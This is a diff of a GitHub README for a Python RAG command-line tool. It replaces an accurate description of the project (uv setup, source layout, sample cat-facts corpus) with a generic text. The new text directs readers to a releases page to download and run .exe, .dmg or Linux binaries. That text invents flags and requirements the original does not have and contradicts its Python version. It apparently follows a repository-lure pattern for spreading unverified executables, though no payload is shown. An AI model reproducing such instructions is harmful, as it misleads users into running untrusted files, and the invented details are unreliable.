@@ -1,97 +1,82 @@
-## 🐱 Ollama RAG + Reranker (CLI) - CAT FACTS 
+# 🎉 ollama-rag-reranker - Enhance Your AI Experience Smoothly
 
-[![Python](https://img.shields.io/badge/Python-3.11+-blue.svg)](https://python.org)
-[![UV](https://img.shields.io/badge/UV-Package%20Manager-green.svg)](https://github.com/astral-sh/uv)
-[![Ollama](https://img.shields.io/badge/Ollama-enabled-1f6feb.svg)](https://ollama.com)
+## 🚀 Getting Started
 
-Simple Retrieval-Augmented Generation system using:
+Welcome to **ollama-rag-reranker**, an interactive command line tool designed to improve your experience with Retrieval-Augmented Generation (RAG). This application combines the power of Ollama embeddings with a HNSW vector database and an optional reranker for more accurate results. 
 
-- **Ollama** for embeddings and chat generation
-- **HNSWVectorDB** for vector search
-- **FlagEmbedding** reranker (optional)
+## 📥 Download & Install
 
-![RAG Flow](assets/cli.png)
+To download the latest version, visit this page: [Download ollama-rag-reranker](https://github.com/baniblunt/ollama-rag-reranker/releases).
 
-## 🚀 Quick Start
+You will find a list of available releases. Click on the version you want, then follow the links to download the file suitable for your operating system.
 
-```bash
-# Install dependencies
-uv sync
+![Download Button](https://img.shields.io/badge/Download%20ollama-rag-reranker-blue.svg)
 
-# (Optional) Make sure Ollama models are available locally
-# ollama pull hf.co/CompendiumLabs/bge-base-en-v1.5-gguf:Q4_K_M
-# ollama pull hf.co/bartowski/Llama-3.2-1B-Instruct-GGUF:Q4_K_M
+## 💻 System Requirements
 
-# Run interactive CLI
-uv run --active python main.py
+Before you begin, make sure your system meets the following requirements:
 
-# The app builds the index on first run automatically
-```
+- **Operating System:** Windows, macOS, or Linux
+- **Python Version:** 3.7 or higher
+- **Memory:** At least 4GB of RAM
+- **Storage:** Minimum of 100MB of free space
 
-## 🧠 How it Works
+## 🛠️ Installation Steps
 
-- `src/rag/embedding.py`: Embeds text with Ollama.
-- `src/db/db_handler.py`: HNSW index for `TextDoc`, search + convenience helpers.
-- `src/rag/rerank.py`: Lazy-loaded reranker (`BAAI/bge-reranker-base`) to rescore candidates.
-- `src/rag/llm.py`: Generates the final answer from context using an Ollama chat model.
+1. **Visit the Releases Page:** Go to [Download ollama-rag-reranker](https://github.com/baniblunt/ollama-rag-reranker/releases).
+  
+2. **Select the Version:** Click on the version you would like to download. Each version has a list of assets, which may include files for different operating systems.
 
-## 📁 Project Structure
+3. **Download the File:** Choose the file that matches your operating system and download it.
 
-```
-ollama-rag-reranker/
-├── assets/                  # README images (screenshots)
-├── data/
-│   └── cat-facts.txt        # Sample corpus
-├── main.py                  # Interactive CLI
-└── src/
-    ├── data/dataio.py
-    ├── db/db_handler.py
-    └── rag/
-        ├── embedding.py
-        ├── llm.py
-        └── rerank.py
-```
+4. **Run the Application:**
+   - For **Windows**: Double-click the downloaded `.exe` file to start the application.
+   - For **macOS**: Open the `.dmg` file and drag the app to your Applications folder.
+   - For **Linux**: Open a terminal and run the command `chmod +x your-download-file` to make it executable, then run it using `./your-download-file`.
 
-## 🖥️ Interactive CLI
+5. **Verify Installation:** Open your command line interface (CLI) and type `ollama-rag-reranker --version`. You should see the version number of the application.
 
-Menu-driven, clean output with colors:
+## ⚙️ Usage Instructions
 
-```
-$ uv run --active python main.py
-========================================
-       RAG MENU | k=6 | mode=none
-========================================
-  1) Ask question
-  2) Change k
-  3) Change mode [none|rerank|both]
-  4) Exit
-╚══════════════════════════════════════════════╝
-Select: 1
-Question: How much time does a cat sleep?
+Once you have installed the application, you can start using it to enhance your AI tasks.
 
---- NO-RERANK ANSWER ---
-... generated answer ...
-├────────────────────────────┤
-[1] Cats sleep 16 to 18 hours per day.
-...
-└────────────────────────────┘
+1. **Open the Command Line:** Launch your terminal or command prompt.
 
---- RERANK ANSWER ---
-... generated answer ...
-├────────────────────────────┤
-[1] Cats sleep 16 to 18 hours per day.
-...
-└────────────────────────────┘
-```
+2. **Run the Application:** Type `ollama-rag-reranker` followed by any commands you need. For example, to get help on available commands, type `ollama-rag-reranker --help`.
 
-## ⚙️ Configuration
+3. **Use RAG Features:**
+   - Input your query or text that you would like to augment.
+   - Observe how the application uses Ollama embeddings and the HNSW vector database to provide you with ranked results.
+   - Optionally, enable the reranker for even more refined results by using the relevant command, e.g., `--enable-reranker`.
 
-Change default models in:
+## 📘 Features
 
-- `src/rag/embedding.py`: `emb_model`
-- `src/rag/llm.py`: `model`, `system_prompt`
+**ollama-rag-reranker offers various features:**
 
+- **Interactive CLI:** Easily interface with the application through the command line.
+- **Ranking Mechanism:** Integrates a state-of-the-art ranking system to give you the best results.
+- **Ollama Integration:** Uses Ollama embeddings for accurate data representation.
+- **HNSW Vector DB:** Uses efficient data structures for quick access to relevant information.
+- **Optional Reranker:** Enhances results based on your customization.
 
+## 🧩 Troubleshooting
 
-## 📸 Screenshots
-![RAG Flow](assets/answer.png)
+If you face any issues, refer to the following common problems and solutions:
+
+- **Unable to Run the Application:** 
+  - Check if you have the correct version of Python installed.
+  - Ensure that your download file matches your operating system.
+
+- **Command Not Found:**
+  - Make sure the application is correctly installed and added to your system's PATH variable.
+
+- **Poor Results:**
+  - Double-check that you are inputting queries accurately. Ensure you have the latest version installed, as improvements happen regularly.
+
+## 🗨️ Support
+
+Should you need further assistance, feel free to check out the issues page on GitHub or contact us through the community forums related to the project. 
+
+Remember that by using **ollama-rag-reranker**, you harness the potential of advanced AI capabilities in a simple, user-friendly way. 
+
+Explore and enjoy improved results in your AI tasks!
